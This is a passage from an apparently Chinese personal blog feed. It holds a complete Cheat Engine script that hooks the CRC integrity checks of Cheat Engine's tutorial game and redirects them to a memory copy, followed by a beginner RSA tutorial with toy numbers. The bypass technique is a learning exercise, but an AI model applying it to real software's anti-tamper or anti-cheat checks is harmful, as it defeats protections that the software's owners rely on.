class="line">alloc(addressThatHoldsTheCopyBase,8)</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheMoudleBase:</span><br><span class="line">dq $process //fill the address with the address of the module base</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheModuleEnd:</span><br><span class="line">dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this in</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheCopyBase://</span><br><span class="line">dq $addressOfCopy</span><br></pre></td></tr></table></figure><p>接下来就是HOOK了</p><p>这里以第一个位置<code>10003B9DC</code>为例，写满了注释，应该比较好理解，可以结合着程序执行流程图来更好的理解。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/%E6%B5%81%E7%A8%8B%E5%9B%BE.PNG" alt="流程图"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//below 4 lines are automatically generated by CE </span><br><span class="line">alloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC) </span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line"></span><br><span class="line">newmem: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">pop rax//Don&apos;t forget to restore RAX :)</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br></pre></td></tr></table></figure><p>关于label，它只是一个标签，可以更方便的标识一段代码，是为了能更方便的实现跳转等。</p><p>接下来只需要复制粘贴，稍作修改，就能适配其他两个位置了。</p><p>需要修改的地方有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所有label的位置</span><br><span class="line">以及jmp exit 上方那一句，那一句要根据original code来</span><br></pre></td></tr></table></figure><h1 id="0x03-完整脚本"><a href="#0x03-完整脚本" class="headerlink" title="0x03 完整脚本"></a>0x03 完整脚本</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为是CT脚本，应该是可以保证这些操作的原子性？</p><p>不过可以确定的是，这些操作应该是可以在极短时间内（小于一个CRC检测周期与CRC检测间隔）完成，经过多次实验，并不会在脚本执行时导致检测未通过。</p><p>另外，顺序是按照第三部分、第二部分、第一部分来的，这也是由于CE模板先添加了第一部分，其次才添加了第二第三部分的缘故，有FILO的味道了。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line"></span><br><span class="line">//first make sure we have a copy of the target module</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if addressOfCopy==nil then</span><br><span class="line">   addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))</span><br><span class="line">end</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line">alloc(addressThatHoldsTheMoudleBase,8)</span><br><span class="line">alloc(addressThatHoldsTheModuleEnd,8)</span><br><span class="line">alloc(addressThatHoldsTheCopyBase,8)</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheMoudleBase:</span><br><span class="line">dq $process //fill the address with the address of the module base</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheModuleEnd:</span><br><span class="line">dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this in</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheCopyBase://</span><br><span class="line">dq $addressOfCopy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//code from here to &apos;[DISABLE]&apos; will be used to enable the cheat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem3,2048,&quot;gtutorial-x86_64.exe&quot;+3BABC) </span><br><span class="line">label(returnhere3)</span><br><span class="line">label(originalcode3)</span><br><span class="line">label(exit3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newmem3: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode3//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode3//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode3:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit3:</span><br><span class="line">pop rax //remember we pushed RAX?</span><br><span class="line">jmp returnhere3</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BABC:</span><br><span class="line">jmp newmem3</span><br><span class="line">nop 2</span><br><span class="line"></span><br><span class="line">returnhere3:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem2,2048,&quot;gtutorial-x86_64.exe&quot;+3BA4C) </span><br><span class="line">label(returnhere2)</span><br><span class="line">label(originalcode2)</span><br><span class="line">label(exit2)</span><br><span class="line"></span><br><span class="line">newmem2: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode2//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode2//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">add edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit2</span><br><span class="line"></span><br><span class="line">originalcode2:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">add edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit2:</span><br><span class="line">pop rax</span><br><span class="line">jmp returnhere2</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BA4C:</span><br><span class="line">jmp newmem2</span><br><span class="line">nop 2</span><br><span class="line">returnhere2:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line"></span><br><span class="line">newmem: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">pop rax//Don&apos;t forget to restore RAX :)</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">[DISABLE]</span><br><span class="line">//code from here till the end of the code will be used to disable the cheat</span><br><span class="line">dealloc(newmem3)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BABC:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 33 55 E4</span><br><span class="line">dealloc(newmem2)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BA4C:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">add edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 03 55 E4</span><br><span class="line">dealloc(newmem)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 33 55 E4</span><br></pre></td></tr></table></figure><h1 id="0x04-写在最后"><a href="#0x04-写在最后" class="headerlink" title="0x04 写在最后"></a>0x04 写在最后</h1><p>应该有一年多没有更博客了</p><p>一年内主要在备战考研，当然也在摸鱼</p><p>也算是运气不好吧，未能一战成硕</p><p>二战也未必是一件坏事，能让自己改掉一些毛病比如拖延症</p><p>在写这篇博客的时候，我确实感受到了学习知识然后分享知识的这种<code>Input then output</code>的快乐</p><p>我也有太多的东西想去学习</p><p>以后的日子里，我也会勤更一下博客，少摸鱼</p><p>二战，好好努力，愿不负自己的努力！</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png" alt></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>RSA从入门到入土</title>
    <url>/2019/11/29/RSA%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/wallpapersden.com_anime-girl-and-colorful-sky_1920x1246.jpg" alt></p><a id="more"></a><h1 id="数学-如星空一般美丽又神秘"><a href="#数学-如星空一般美丽又神秘" class="headerlink" title="数学,如星空一般美丽又神秘"></a>数学,如星空一般美丽又神秘</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/10_encrypt-for-security-100732873-large.jpg" alt></p><ul><li>RSA是1977年由Ron Rivest、Adi Shamir、Leonard Adleman一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/d01373f082025aafcb78cac5fbedab64034f1a71.jpg" alt></p><ul><li><p>RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。</p></li><li><p>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开。</p></li><li><p>本文将介绍RSA算法所需的知识基础、RSA算法基本原理。</p></li></ul><h1 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h1><ul><li>RSA算法加解密其实就是两个公式，但是为了理解这两个公式我们需要学习数论中的四个概念：<code>互质、欧拉函数、欧拉定理、模反元素</code>，这四个概念都是非常好理解的，只需要有初高中的数学知识就能理解。</li></ul><h2 id="互质关系"><a href="#互质关系" class="headerlink" title="互质关系"></a>互质关系</h2><ul><li><p>互质整数是公约数只有1的两个整数,比如15和32,这说明不是质数也可以构成互质关系。</p></li><li><p>关于互质关系,有以下结论:</p></li></ul><ol><li>任意两个质数构成互质关系，比如13和61</li><li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10</li><li>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57</li><li>p是大于1的奇数，则p和p-2构成互质关系，比如27和25</li><li>p是大于1的整数，则p和p-1构成互质关系，比如53和52</li><li>1和任意一个自然数是都是互质关系，比如1和99</li></ol><h2 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h2><ul><li><p>欧拉函数听起来很高大上，但其实非常简单，欧拉函数是小于x的整数中与x互质的数的个数，一般用φ(x)表示。例如φ(8)就等于4,因为8以内的与8互质的数只有1、3、5、7这四个数。</p></li><li><p>关于欧拉函数有几点性质:</p></li></ul><ol><li>特殊的，<code>φ(1)=1</code>。</li><li>如果n是质数，则 <code>φ(n)=n-1</code> 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</li><li>如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 <img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191129133724.png" alt>比如 φ(8) = φ(2^3) =2^3 – 2^2 = 8 -4 = 4。</li><li>如果n可以分解成两个互质的整数之积,即<code>n = p1 × p2</code>,则<code>φ(n) = φ(p1p2) = φ(p1) × φ(p2)</code>。</li></ol><h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><ul><li><p>欧拉函数的用处，在于欧拉定理，而欧拉定理是RSA算法的核心。</p></li><li><p><code>欧拉定理</code>指的是: 如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191129140629.png" alt></p><ul><li><p>其中’≡’是恒等号(在这也可叫为同余号),表示该等式始终成立而与n、a的值无关。</p></li><li><p>这个式子的含义为:a的φ(n)次方除以n的余数为1。</p></li><li><p>欧拉定理的证明较为复杂,我们只需要记住这条结论就行,挺好记的。</p></li></ul><h2 id="模反元素"><a href="#模反元素" class="headerlink" title="模反元素"></a>模反元素</h2><ul><li><p>如果两个正整数a和n互质，那么一定可以找到整数b(不一定唯一)，使得 ab-1 被n整除，或者说ab除以n的余数是1。</p></li><li><p>即 <code>ab≡1 (mod n)</code>, 这时，b就叫做a的“乘法逆元（乘法模反元素）”。</p></li><li><p>比如，5和17互质，那么7就是5的模反元素,同时24、41、58…都是5的模反元素，即如果b是a的模反元素，则 <code>b+kn</code> 都是<code>a</code>的模反元素。</p></li></ul><h2 id="明文and密文"><a href="#明文and密文" class="headerlink" title="明文and密文"></a>明文and密文</h2><ul><li>最后我们介绍一组概念。</li></ul><ol><li>明文(Plain Text):明文，是指没有加密的文字（或者字符串），属于密码学术语。</li><li>密文(Cipher Text):密文是加了密的的文字。</li></ol><ul><li>即明文是加密之前的文字。密文是对明文进行加密后的报文。</li></ul><h2 id="看得有点迷-没关系-后面有具体示例"><a href="#看得有点迷-没关系-后面有具体示例" class="headerlink" title="看得有点迷?没关系,后面有具体示例"></a>看得有点迷?没关系,后面有具体示例</h2><h1 id="RSA算法基本原理"><a href="#RSA算法基本原理" class="headerlink" title="RSA算法基本原理"></a>RSA算法基本原理</h1><ul><li><p>RSA是一种非对称加密算法。非对称加密算法的优点我们会在后面的RSA加解密演示中介绍到。</p></li><li><p>在进行RSA加密与解密之前,我们先要有RSA密钥,即公钥和私钥。</p></li><li><p>我们用公钥对明文进行加密, 用私钥对密文进行解密。公钥是可以让所有人都知道的,但是私钥只能我们自己知道。</p></li></ul><h2 id="密钥生成规则"><a href="#密钥生成规则" class="headerlink" title="密钥生成规则"></a>密钥生成规则</h2><h3 id="1-随机选择两个不相等的质数p和q"><a href="#1-随机选择两个不相等的质数p和q" class="headerlink" title="(1)随机选择两个不相等的质数p和q"></a>(1)随机选择两个不相等的质数p和q</h3><ul><li>我们选择61和53,在实际应用中,这两个质数越大就越难破解。</li></ul><h3 id="2-计算p和q的乘积n"><a href="#2-计算p和q的乘积n" class="headerlink" title="(2)计算p和q的乘积n"></a>(2)计算p和q的乘积n</h3><ul><li><code>n = 61 * 53 = 3233</code></li><li>3233写成二进制是110010100001共12位,故该密钥是12位的,目前主流可选值：1024、2048、3072、4096…低于1024bit的密钥已经不建议使用（安全问题）。</li></ul><h3 id="3-计算n的欧拉函数φ-n"><a href="#3-计算n的欧拉函数φ-n" class="headerlink" title="(3)计算n的欧拉函数φ(n)"></a>(3)计算n的欧拉函数φ(n)</h3><ul><li><p>因为n = p*q,由欧拉函数的小性质 ,<code>如果n = p × q且p、q互质,则φ(n) = φ(pq) = φ(p)φ(q)</code>。</p></li><li><p>由于我们的p和q都是质数,再一次由欧拉函数的小性质<code>如果n是质数，则 φ(n)=n-1</code>,可得<code>φ(p) = p-1</code> , <code>φ(q) = q - 1</code>。所以我们的<code>φ(n) = (p-1)(q-1)</code></p></li><li><p>所以我们例子中的<code>φ(n) = 60×52 = 3120</code>。</p></li></ul><h3 id="4-按照条件随机选择一个整数e"><a href="#4-按照条件随机选择一个整数e" class="headerlink" title="(4)按照条件随机选择一个整数e"></a>(4)按照条件随机选择一个整数e</h3><ul><li><p>选择e的条件是 <code>1&lt; e &lt; φ(n)，且e与φ(n) 互质</code>。</p></li><li><p>本例中选取e = 17,但实际应用中e常常取65537 。</p></li></ul><h3 id="5-计算e对于φ-n-的模反元素d"><a href="#5-计算e对于φ-n-的模反元素d" class="headerlink" title="(5)计算e对于φ(n)的模反元素d"></a>(5)计算e对于φ(n)的模反元素d</h3><ul><li><p>根据欧拉定理我们有:<code>ed ≡ 1 ( mod φ(n) )</code></p></li><li><p>即 <code>ed–kφ(n)=1</code></p></li><li><p>将<code>e = 17</code>,<code>φ(n) = 3120</code>代入可得:<code>17d–3120k=1</code></p></li><li><p>这里我们采用拓展欧几里得算法求解d的值。</p></li></ul><blockquote><p>拓展欧几里得算法可用来求解线性同余方程<code>a∗x≡c(modb) 且c=1</code>的情况。我们可以把该方程转换成<code>a∗x+b∗y=1</code>这种形式。</p></blockquote><ul><li>此处给出求解代码:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">phin = <span class="number">3120</span></span><br><span class="line">    </span><br><span class="line">d = modinv(e,phin)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> <span class="string">'d = '</span> + str(d)</span><br></pre></td></tr></table></figure><ul><li>这样求出我们的<code>d = 2753</code>。</li></ul><h3 id="6-将n和e封装成公钥-n和d封装成私钥"><a href="#6-将n和e封装成公钥-n和d封装成私钥" class="headerlink" title="(6) 将n和e封装成公钥,n和d封装成私钥"></a>(6) 将n和e封装成公钥,n和d封装成私钥</h3><ul><li>前面我们已经求出来了:</li></ul><ol><li>p = 61</li><li>q = 53; 或者写成p = 53,q = 61都可以。</li><li>n = pq = 3233</li><li>φ(n) = (p-1)(q-1) = 3120</li><li>e = 17; 满足1&lt; e &lt; φ(n)，且e与φ(n) 互质。</li><li>d = 2753;e对于φ(n)的模反元素d。</li></ol><ul><li>所以我们的公钥就是<code>(n,e) = (3233,17)</code>,私钥就是<code>(n,d) = (3233,2753)</code>。</li></ul><h3 id="RSA算法可靠性分析"><a href="#RSA算法可靠性分析" class="headerlink" title="RSA算法可靠性分析"></a>RSA算法可靠性分析</h3><ul><li><p>我们一共生成了六个数字：p、q、n、φ(n)、e、d，这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p></li><li><p>那么，有无可能在已知n和e的情况下，推导出d？</p></li></ul><ol><li><code>ed≡1 (mod φ(n))</code>。只有知道e和φ(n)，才能算出d。</li><li>而<code>φ(n)=(p-1)(q-1)</code>。只有知道p和q，才能算出φ(n)。</li><li>而<code>n=pq</code>。只有将n因数分解，才能算出p和q。</li></ol><ul><li><p>综上,如果n可以被因数分解,那么就可以算出d,从而拿到私钥。</p></li><li><p>大数的因数分解是非常困难的。限制人类分解大整数的是计算机的计算能力，相信如果有一天真正的量子计算机问世后，又会引发一轮安全加密竞赛！</p></li></ul><h2 id="RSA加解密演示"><a href="#RSA加解密演示" class="headerlink" title="RSA加解密演示"></a>RSA加解密演示</h2><h3 id="情景导入"><a href="#情景导入" class="headerlink" title="情景导入"></a>情景导入</h3><ul><li>我们以经典的Alice和Bob的故事来导入情景。</li><li>Alice在学习了RSA算法以后,制作了公钥和私钥(假定和我们上面制作的公钥私钥一样),Alice将公钥发送给Bob并告诉Bob以后给自己发消息之前先用公钥进行加密，Alice自己保留私钥。</li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><ul><li><p>假设某天Bob要给Alice发送一个字母’A’,Bob需要先将’A’转为ascii码65，所以m = 65。ps: m必须是整数(字符串可以取ascii值或unicode值)，且<code>m必须小于n</code>。</p></li><li><p>那么我们根据下图关系可得到密文c。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191129192937.png" alt></p><ul><li><p>由于我们的公钥是<code>(n,e) = (3233,17)</code>,那么有<code>65^17≡c(mod 3233)</code>(本文中的’^’均表示几次方而不表示异或),这样我们求得<code>c = 2790</code>,那么Bob就可以把<code>c = 2790</code>发送给Alice了。</p></li><li><p>这样即使有第三者截获了密文c,或者截获了公钥和密文c,由于第三者没有私钥,很难将密文c解密到明文m。此时非对称加密的优点便体现出来了。如果看得有点迷,没关系,咱们打个比方。</p></li><li><p>非对称加密就像Alice将一把已经打开的锁发送给了Bob而自己留着开锁钥匙,让Bob每次给自己发送消息的时候都用这把锁将消息锁住,当Alice收到消息后用只有自己才有的钥匙来解锁得到真正的信息。这样就算第三者劫持了密文和锁,因为没有钥匙,也很难很难拿到真正的消息。</p></li><li><p>假设我们用的对称加密,往往会把密钥和密文一同传给接收者,就像把钥匙和密文一起发送出去,这样如果一旦有第三者截获了密文和钥匙,就很容易利用密钥解密得到明文。</p></li></ul><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><ul><li>当Alice拿到密文<code>c = 2790</code>,就可以用私钥根据下图关系可得消息m，也就是我们的明文。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191129193548.png" alt></p><ul><li>接收者的私钥<code>(n,d) = (3233,2753)</code>，所以得到<code>2790^2753 ≡ m(mod 3233)</code>。从而可以解得m = 65,转换成字符就是我们的消息’A’。</li></ul><h3 id="再一例"><a href="#再一例" class="headerlink" title="再一例"></a>再一例</h3><ul><li><p>如果我们的明文m不止一个字符,而是一段话(字符串),该如何发送呢？</p></li><li><p>假设Bob要给Alice发送<code>&quot;Hello&quot;</code>,我们需要先str转hex得到<code>0x48656c6c6f</code>,转换为10进制则得到<code>m = 310939249775</code>。 即 str-&gt;hex-&gt;十进制。</p></li><li><p>关于这里的str转hex,提供一个小方法,当然还有更简便的方法比如libnum.s2n: 我们可以遍历字符串中的每个字符,得到每个字符ascii码值的16进制,然后依次拼接,最后在拼接成的字符串前面加上0x,然后16进制转10进制。如果写成代码就是:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">'Hello'</span></span><br><span class="line">res = <span class="string">'0x'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    res += hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(int(res,<span class="number">16</span>))</span><br></pre></td></tr></table></figure><ul><li>由于我们前面也谈到了<code>m必须小于n</code>,但是显然我们这个例子里的<code>m=310939249775</code>大于<code>n=3233</code>,我们需要重新生成公钥和私钥。</li><li>生成过程略,这里直接列出我们的生成结果。</li></ul><ol><li>p = 999671</li><li>q = 999727</li><li>φ(n) = 999396090420</li><li>n = 999398089817</li><li>e = 65537</li><li>d = 529762121873</li></ol><ul><li><p>所以公钥为<code>(n,e)=(999398089817,65537)</code>,私钥为<code>(n,d)=(999398089817,529762121873)</code>。</p></li><li><p>那么根据<code>m^e ≡ c(mod n)</code>即<code>310939249775^65537 ≡ c(mod 999398089817)</code>,我们可以求得<code>c = 274054322757</code>。</p></li><li><p>那么Alice在拿到密文<code>c = 274054322757</code>以后,根据<code>c^d ≡ m(mod n)</code>,即<code>274054322757^529762121873 ≡ m (mod n)</code>得到<code>m = 310939249775</code>。</p></li><li><p>那么我们就可以通过m转成我们的明文了。依然是提供几个方法,可能还有更好的方法~</p></li></ul><ol><li>print long_to_bytes(m)#需要引入库<code>from Crypto.Util.number import *</code></li><li>print hex(m)[2:].replace(‘L’,’’).decode(‘hex’)</li></ol>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
  </entry>
  <entry>
    <title>SKCTF_2019</title>
    <url>/2019/05/29/SKCTF-2019/</url>
